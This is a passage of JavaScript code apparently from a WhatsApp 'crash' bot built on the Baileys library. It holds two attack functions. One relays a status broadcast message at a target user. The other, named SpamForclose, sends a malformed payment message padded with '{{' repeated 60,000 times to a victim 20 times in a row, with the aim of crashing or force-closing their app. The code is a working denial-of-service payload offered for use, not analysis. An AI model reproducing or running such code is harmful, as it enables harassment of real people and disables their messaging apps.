                  contextInfo: {
                    forwardingScore: 100,
                    isForwarded: true,
                    businessMessageForwardInfo: {
                      businessOwnerJid: "13135550002@s.whatsapp.net",
                    },
                  },
                },
              },
            },
          },
        },
      },
    };

    for (const msg of [msg1]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }],
              },
            ],
          },
        ],
      });

      console.log(
        `Wolker Your Devices Sending  To ${target} suksesfull`
      );
    }
  } catch (e) {
    console.error(e);
  }
}

async function SpamForclose(sock, target) {
  const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

  const msg = generateWAMessageFromContent(
    target,
    {
      payload_unicode_overflow_render: {
        ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "Crash Metadata",
                  matchedText: "https://t.me/zunncrash",
                  description: "🩸⃟༑⌁⃰Busett 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠️",
                  title: "‌𐎟 𝐓‌𝐑𝐕‌𝐒𝐗 ⿻ 𝐂‌𝐋𝐈𝚵‌𝐍𝐓‌ 𐎟",
                  paymentLinkMetadata: {
                    button: { displayText: " SEJAYA - MAMPUS FC " },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(60000) }
                  }
                }
              }
            }
          }
        }
      }
    },
    {}
  );

  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
  }
  
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  await sleep(2000);
}
//And The Function


bot.launch()
